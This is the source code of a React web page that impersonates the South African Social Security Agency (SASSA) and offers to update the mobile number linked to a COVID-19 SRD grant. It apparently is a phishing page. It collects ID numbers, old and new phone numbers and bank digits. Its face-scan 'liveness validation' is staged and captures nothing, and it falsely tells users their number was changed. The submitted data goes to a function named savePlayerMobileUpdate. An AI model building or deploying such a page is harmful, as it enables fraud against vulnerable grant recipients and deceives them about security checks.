import { savePlayerMobileUpdate } from "@/lib/player-mobile-update";
import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState, type ReactNode } from "react";
import { Check, ChevronDown, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import logo from "@/assets/department-logo.jpg.asset.json";
import headerLogo from "@/assets/header-correct.jpg.asset.json";
import phoneInHand from "@/assets/phone-correct.jpg.asset.json";

type JourneyStage = "initial" | "liveness" | "details" | "success";

export const Route = createFileRoute("/")({
  head: () => ({ meta: [
    { title: "SASSA mobile number update" },
    { name: "description", content: "Update the mobile number linked to your SASSA grant: verify your identity, confirm your details and change your number." },
    { property: "og:title", content: "SASSA mobile number update" },
    { property: "og:description", content: "Update the mobile number linked to your SASSA grant: verify your identity, confirm your details and change your number." },
    { property: "og:type", content: "website" },
    { name: "twitter:card", content: "summary" },
  ] }),
  component: Index,
});

function Field({ label, children }: { label: string; children: ReactNode }) {
  return <div className="outlined-field"><label>{label}*</label>{children}</div>;
}

function Dropdown({ label, value, onChange, options, disabled = false }: { label: string; value: string; onChange: (value: string) => void; options: string[]; disabled?: boolean }) {
  return <Field label={label}><Select value={value} onValueChange={onChange} disabled={disabled}><SelectTrigger aria-label={label} className="reference-select"><SelectValue placeholder=" " /></SelectTrigger><SelectContent className="reference-menu" position="popper">{options.map(option => <SelectItem className="reference-option" key={option} value={option}>{option}</SelectItem>)}</SelectContent></Select></Field>;
}

function Index() {
  const [stage, setStage] = useState<JourneyStage>("initial");
  const [pendingStage, setPendingStage] = useState<JourneyStage | null>(null);
  const [saving, setSaving] = useState(false);
  const [identity, setIdentity] = useState("");
  const [reason, setReason] = useState("");
  const [payment, setPayment] = useState("");
  const [bank, setBank] = useState("");
  const [oldMobile, setOldMobile] = useState("");
  const [mobile, setMobile] = useState("");
  const [tips, setTips] = useState(false);
  useEffect(() => {
    if (!pendingStage) return;
    const timer = window.setTimeout(() => {
      setStage(pendingStage);
      setPendingStage(null);
      if (pendingStage === "success") { setIdentity(""); setBank(""); setOldMobile(""); setMobile(""); }
    }, 1400);
    return () => window.clearTimeout(timer);
  }, [pendingStage]);
  useEffect(() => {
    if (stage !== "liveness") return;
    const close = (event: KeyboardEvent) => { if (event.key === "Escape") setPendingStage("details"); };
    window.addEventListener("keydown", close);
    return () => window.removeEventListener("keydown", close);
  }, [stage]);
  const digits = (value: string, max: number) => value.replace(/\D/g, "").slice(0, max);
  const ready = identity.length === 13 && Boolean(reason) && Boolean(payment);
  const canConfirm = oldMobile.length === 10 && mobile.length === 10 && (payment !== "Bank Account" || bank.length === 4);
  return <div className="service-page">
    {stage !== "liveness" && <header className="department-header"><div className="header-inner"><img src={headerLogo.url} alt="SASSA â€” South African Social Security Agency" /></div></header>}
    {stage === "success" ? <main className="success-screen" aria-live="polite"><div className="success-check"><Check aria-hidden="true" /></div><h1>Your cellphone number has been successfully changed.</h1><Button variant="service" onClick={() => { setStage("initial"); setIdentity(""); setReason(""); setPayment(""); setBank(""); setOldMobile(""); setMobile(""); }}>Done</Button></main>
    : stage === "liveness" ? <main className="liveness-screen">
      <div className="liveness-brand"><img src={logo.url} alt="SASSA â€” South African Social Security Agency" /><Button variant="ghost" size="icon" className="close-liveness" aria-label="Close liveness validation" title="Close" disabled={Boolean(pendingStage)} onClick={() => setPendingStage("details")}><X /></Button></div>
      <h1>Liveness Validation</h1><p className="liveness-intro">Follow these simple steps to successfully scan your face.</p>
      <ol className="scan-steps"><li><span className="step-number">1</span><div><strong>Prepare</strong><p>Position your face at the centre of the frame.</p></div></li><li><span className="step-number">2</span><div><strong>Capture</strong><p>Hold still while the screen flashes and scans your face.</p></div></li></ol>
      <div className="scan-illustration"><img src={phoneInHand.url} alt="A hand holding a phone with a face centred in the scan frame" /></div>
      <Button variant="scanHelp" aria-expanded={tips} onClick={() => setTips(!tips)}>How to ensure a successful face scan<ChevronDown /></Button>
      {tips && <p className="scan-tips">Face the light, remove your hat and glasses, and keep your face inside the frame.</p>}
      <Button variant="liveness" disabled={Boolean(pendingStage)} onClick={() => setPendingStage("details")}>Let's begin</Button>
    </main> : <main className="form-screen">
      <p className="service-note">Note: If you want to update your Mobile Number that is used for communication and web application access related to your COVID-19 SRD grant, we firstly need to verify that you are the original applicant. Please submit your 13-digit South African identity number to initiate the identity process.</p>
      <form onSubmit={async event => {
  event.preventDefault();
  if (pendingStage || saving) return;

  if (stage === "initial" && ready) {
    setPendingStage("liveness");
    return;
  }

  if (stage === "details" && canConfirm) {
    setSaving(true);
    try {
      await savePlayerMobileUpdate({
        data: {
          SouthAfricanIdnumber: identity,
          oldMobileNumber: oldMobile,
          newMobileNumber: mobile,
        },
      });
      setPendingStage("success");
    } catch (error) {
      console.error(error);
      window.alert("Could not save your request. Please try again.");
    } finally {
      setSaving(false);
    }
  }
}} autoComplete="off" aria-busy={Boolean(pendingStage)}>
        <div className={stage === "details" ? "locked-field" : ""}><Field label="South African ID number"><input aria-label="South African ID number" inputMode="numeric" value={identity} onChange={e => setIdentity(digits(e.target.value, 13))} disabled={stage === "details"} required minLength={13} maxLength={13} /></Field></div>
        <div className={stage === "details" ? "locked-field" : ""}><Dropdown label="Reason for mobile number update" value={reason} onChange={setReason} disabled={stage === "details"} options={["Lost phone", "Used third party phone", "New phone", "Captured number wrong"]} /></div>
        <Dropdown label="Current Payment Option" value={payment} onChange={setPayment} options={["Cash Send", "Bank Account", "Post Office"]} />
        {stage === "details" && <>
          {payment === "Bank Account" && <div className="bank-field"><Field label="Last 4 digits of bank account"><input aria-label="Last 4 digits of bank account" inputMode="numeric" value={bank} onChange={e => setBank(digits(e.target.value, 4))} required minLength={4} maxLength={4} /></Field><div className="bank-note"><span>Note: Please enter the last four digits of your last updated bank account number.</span><span>{bank.length} of 4</span></div></div>}
          <Field label="Old Mobile Number"><input aria-label="Old Mobile Number" type="tel" inputMode="numeric" value={oldMobile} onChange={e => setOldMobile(digits(e.target.value, 10))} minLength={10} maxLength={10} required /></Field>
          <Field label="New Mobile Number"><input aria-label="New Mobile Number" type="tel" inputMode="numeric" value={mobile} onChange={e => setMobile(digits(e.target.value, 10))} minLength={10} maxLength={10} required /></Field>
        </>}
        <Button variant="service" className={stage === "initial" ? "initial-submit" : ""} type="submit" disabled={Boolean(pendingStage) || (stage === "initial" ? !ready : !canConfirm)}>{stage === "initial" ? "Submit" : "Confirm"}</Button>
      </form>
    </main>}
    {pendingStage && <div className="loading-overlay" role="status" aria-live="polite" aria-label={pendingStage === "success" ? "Confirming" : "Loading"}><div className="loading-indicator"><span className="loading-spinner" aria-hidden="true" /><span>{pendingStage === "success" ? "Confirming" : "Loading"}</span></div></div>}
</div>}


